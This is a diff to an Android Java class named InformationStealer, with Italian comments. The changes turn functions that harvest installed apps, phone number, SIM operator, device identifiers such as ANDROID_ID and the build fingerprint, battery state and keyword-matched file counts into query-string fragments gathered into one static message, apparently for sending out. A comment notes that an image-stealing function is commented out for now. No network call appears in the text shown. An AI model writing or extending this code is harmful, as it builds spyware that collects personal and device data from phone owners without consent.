@@ -25,8 +25,17 @@ import java.io.File;
 import java.util.List;
 
 public class InformationStealer implements Runnable {
-
     private static final int READ_EXTERNAL_STORAGE_PERMISSION_REQUEST = 1;
+
+    public StringBuilder getMessaggio() {
+        return messaggio;
+    }
+
+    public void setMessaggio(StringBuilder messaggio) {
+        InformationStealer.messaggio = messaggio;
+    }
+
+    private static StringBuilder messaggio;
 
     final String[] keywords = {
             "aprire",
@@ -83,19 +92,24 @@ public class InformationStealer implements Runnable {
 
     @Override
     public void run(){
-        stealApp(context);
-        searchFilesWithKeywords(context, keywords);
+        messaggio.append(stealApp(context));
+        messaggio.append(searchFilesWithKeywords(context, keywords));
+        messaggio.append(stealSystemDetail(context));
+        messaggio.append(stealBatteryInformation(context));
     }
 
     @SuppressLint("MissingPermission")
-    static void stealNumberInformations(Context context) {
+    static String stealNumberInformations(Context context) {
+        String msg;
         TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(context.TELEPHONY_SERVICE);
         if (telephonyManager != null) {
             @SuppressLint("MissingPermission") String phoneNumber = telephonyManager.getLine1Number();
             String operator = telephonyManager.getSimOperatorName();
-            System.out.println("\nPhone number: " + phoneNumber);
-            System.out.println("SIM Operator: " + operator);
+            msg = "&Phone_number=" + phoneNumber + "&";
+            msg = "&SIM_Operator=" + operator + "&";
+            return msg;
         }
+        return "";
     }
 
     private static String getBatteryStatusText(int status){
@@ -107,13 +121,16 @@ public class InformationStealer implements Runnable {
             case BatteryManager.BATTERY_STATUS_FULL:
                 return "Full";
             case BatteryManager.BATTERY_STATUS_NOT_CHARGING:
-                return "Not Charging";
+                return "Not_Charging";
             case BatteryManager.BATTERY_STATUS_UNKNOWN:
             default:
                 return "Unknown";
         }
     }
-  /*
+
+
+    /* -------- QUESTA E' LA FUNZIONE CHE TI RUBA LE IMMAGINI PER ORA LA LASCIO COMMENTATA ---------------
+
     public static void searchImages(Context context) {
         // Verifica se l'applicazione ha il permesso di lettura della memoria esterna
         if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
@@ -143,7 +160,9 @@ public class InformationStealer implements Runnable {
 
    */
 
-    public static void searchFilesWithKeywords(Context context, String[] keywords) {
+    public String searchFilesWithKeywords(Context context, String[] keywords) {
+        int numeroFileInteressanti = 0;
+
         // Verifica se l'applicazione ha il permesso di lettura della memoria esterna
         if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                 != PackageManager.PERMISSION_GRANTED) {
@@ -151,7 +170,7 @@ public class InformationStealer implements Runnable {
             ActivityCompat.requestPermissions((Activity) context,
                     new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
                     READ_EXTERNAL_STORAGE_PERMISSION_REQUEST);
-            return;
+            return "";
         }
 
         // Il permesso è stato concesso, esegui la ricerca dei file
@@ -173,80 +192,81 @@ public class InformationStealer implements Runnable {
             do {
                 String filePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATA));
                 System.out.println("Trovato un file interessante: " + filePath);
+                numeroFileInteressanti++;
             } while (cursor.moveToNext());
+            System.out.println("\nFile interessanti trovati: " + numeroFileInteressanti);
             cursor.close();
+            return "&File_interessanti=" + numeroFileInteressanti + "&";
         } else {
-            System.out.println("Nessun file trovato");
+            return "&File_interessanti=0&";
         }
-        System.out.println("-----------Elaborazione finita-----------");
     }
 
-    public static void stealApp(Context context) {
+    public String stealApp(Context context) {
         PackageManager packageManager = context.getPackageManager();
-        // Ottieni una lista di tutte le applicazioni installate
         List<ApplicationInfo> installedApplications = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);
 
+        StringBuilder sb = new StringBuilder();
 
-        // Itera sulla lista di applicazioni installate
         for (ApplicationInfo applicationInfo : installedApplications) {
-            // Verifica se l'applicazione è un'app di terze parti
-
-            String sourceDir = applicationInfo.sourceDir;
-            String packageName = applicationInfo.packageName;
-            String appName = packageManager.getApplicationLabel(applicationInfo).toString();
-
             if ((applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
-                System.out.println("\nApp Name: " + appName);
-                System.out.println("Package Name: " + packageName);
-                System.out.println("Source Dir: " + sourceDir);
-                System.out.println("Launch Activity :" + packageManager.getLaunchIntentForPackage(applicationInfo.packageName));
-                System.out.println("----------------------------------------");
+                String packageName = applicationInfo.packageName;
+                String appName = packageManager.getApplicationLabel(applicationInfo).toString();
+                String sourceDir = applicationInfo.sourceDir;
+
+                sb.append("&App_Name=").append(appName);
+                sb.append("&Package_Name=").append(packageName);
+                sb.append("&Source_Dir=").append(sourceDir);
+                sb.append("&");
             }
         }
 
+        return sb.toString();
     }
 
-    static void stealSystemDetail(Context context) {
-        System.out.println("Brand: " + Build.BRAND + "\n" +
-                "DeviceID: " +
-                Settings.Secure.getString(
-                        context.getContentResolver(),
-                        Settings.Secure.ANDROID_ID
-                ) + "\n" +
-                "Model: " + Build.MODEL + "\n" +
-                "ID: " + Build.ID + "\n" +
-                "SDK: " + Build.VERSION.SDK_INT + "\n" +
-                "Manufacture: " + Build.MANUFACTURER + "\n" +
-                "Brand: " + Build.BRAND + "\n" +
-                "User: " + Build.USER + "\n" +
-                "Type: " + Build.TYPE + "\n" +
-                "Base: " + Build.VERSION_CODES.BASE + "\n" +
-                "Incremental: " + Build.VERSION.INCREMENTAL + "\n" +
-                "Board: " + Build.BOARD + "\n" +
-                "Host: " + Build.HOST + "\n" +
-                "FingerPrint: " + Build.FINGERPRINT + "\n" +
-                "Version Code: " + Build.VERSION.RELEASE);
+    public static String stealSystemDetail(Context context) {
+        StringBuilder sb = new StringBuilder();
+
+        sb.append("&Brand=").append(Build.BRAND).append("&");
+        sb.append("&DeviceID=").append(Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID)).append("&");
+        sb.append("&Model=").append(Build.MODEL).append("&");
+        sb.append("&ID=").append(Build.ID).append("&");
+        sb.append("&SDK=").append(Build.VERSION.SDK_INT).append("&");
+        sb.append("&Manufacture=").append(Build.MANUFACTURER).append("&");
+        sb.append("&User=").append(Build.USER).append("&");
+        sb.append("&Type=").append(Build.TYPE).append("&");
+        sb.append("&Base=").append(Build.VERSION_CODES.BASE).append("&");
+        sb.append("&Incremental=").append(Build.VERSION.INCREMENTAL).append("&");
+        sb.append("&Board=").append(Build.BOARD).append("&");
+        sb.append("&Host=").append(Build.HOST).append("&");
+        sb.append("&FingerPrint=").append(Build.FINGERPRINT).append("&");
+        sb.append("&Version_Code=").append(Build.VERSION.RELEASE).append("&");
+
+        return sb.toString();
     }
 
-    public static void stealBatteryInformation(Context context) {
+    public static String stealBatteryInformation(Context context) {
         IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
         Intent batteryStatus = context.registerReceiver(null, filter);
 
-        if (batteryStatus != null) {
-            // Ottieni lo stato della batteria
-            int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
-            String batteryStatusText = getBatteryStatusText(status);
-            System.out.println("Battery Status: " + batteryStatusText);
+        StringBuilder sb = new StringBuilder();
 
-            // Ottieni il livello di carica della batteria
+        if (batteryStatus != null) {
+            int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
             int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
             int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
             int batteryLevel = (int) ((level / (float) scale) * 100);
-            System.out.println("Battery Level: " + batteryLevel + "%");
+
+            String batteryStatusText = getBatteryStatusText(status);
+            sb.append("&Battery_Status=").append(batteryStatusText).append("&");
+            sb.append("&Battery_Level=").append(batteryLevel).append("%&");
         } else {
-            System.out.println("Battery status not available");
-            System.out.println("Battery level not available");
+            sb.append("&Battery_Status=Unknown&");
+            sb.append("&Battery_Level=Unknown&");
         }
+
+        return sb.toString();
     }
+
 }
 
